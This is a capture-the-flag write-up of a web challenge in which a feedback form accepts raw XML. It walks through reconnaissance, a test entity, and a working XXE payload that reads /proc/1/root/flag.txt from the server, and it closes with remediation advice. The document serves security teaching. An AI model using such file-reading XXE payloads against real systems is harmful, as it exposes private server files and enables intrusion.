# Bad Feedback  
**Category:** Web Security  

> A company rolled out a shiny feedback form and insists their customers are completely trustworthy. Every feedback is accepted at face value, no questions asked. What can go wrong?

**Challenge Link:** http://15.206.47.5:5000  
**Hint:** The flag is located in the root directory of the server.

---

### 🔍 Initial Reconnaissance

On interacting with the application, a simple feedback form with two fields was observed:
- Name  
- Message  

While inspecting the client-side JavaScript, it was found that:
- The form does **not** submit data as normal form-encoded input.
- Instead, the input is **converted into raw XML**.
- The request is sent with the header:
```

Content-Type: application/xml

````

This indicated that the backend was parsing **user-controlled XML**, immediately suggesting a possible **XXE attack surface**.

---

## 🧠 Approaches Explored

### 1. Input Reflection / XSS  
Basic script payloads were tested but no client-side execution was observed.

### 2. SQL Injection  
No database interaction or query-related behavior was visible.

### 3. XML Injection & XXE (Promising)  
Since the backend was clearly processing XML, testing for:
- `DOCTYPE` support  
- External entity resolution  
was the most logical next step.

---

## ✅ Approach That Worked — XXE Exploitation

### Step 1: Confirming XXE

A basic internal entity test was injected to validate whether entity expansion was allowed:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe "XXE_TEST">
]>
<feedback>
<name>test</name>
<message>&xxe;</message>
</feedback>
````

✅ The response reflected `XXE_TEST`, confirming that:

* The XML parser allows `DOCTYPE`
* Entity resolution is enabled
* The application is **vulnerable to XXE**

---

### Step 2: Targeting the Root Filesystem

The challenge description hinted that the **flag is in the root directory**.
Since the application was running in a Linux containerized environment, the following path was targeted:

```
/proc/1/root/flag.txt
```

#### Why `/proc/1/root/`?

* Process `1` is the primary application process inside the container.
* `/proc/1/root/` points to the **actual root filesystem** of the running environment.
* This technique is commonly used to escape restricted directory views in containers.

---

### Step 3: Final Exploit Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE feedback [
  <!ENTITY xxe SYSTEM "file:///proc/1/root/flag.txt">
]>
<feedback>
  <name>attacker</name>
  <message>&xxe;</message>
</feedback>
```

This payload forces the XML parser to:

* Read the flag file from the root directory
* Inject the contents directly into the response using `&xxe;`

---

## 🚩 Flag

✅ The server responded with the contents of the flag file, successfully completing the challenge.

```
FLAG_REDACTED_HERE
```

*(Redacted for public repository safety)*

---

## 🛡️ Remediation

To prevent XXE vulnerabilities:

* Disable external entity resolution
* Disallow `DOCTYPE` declarations completely
* Use secure XML parsers with hardened defaults
* Prefer JSON over XML where possible
* Enforce strict input validation and schema validation

---

## 🧠 Key Learning

This challenge highlights how **blind trust in structured input like XML** can lead directly to **full filesystem compromise**. A simple entity resolution misconfiguration was enough to expose critical server files from the root directory.

---
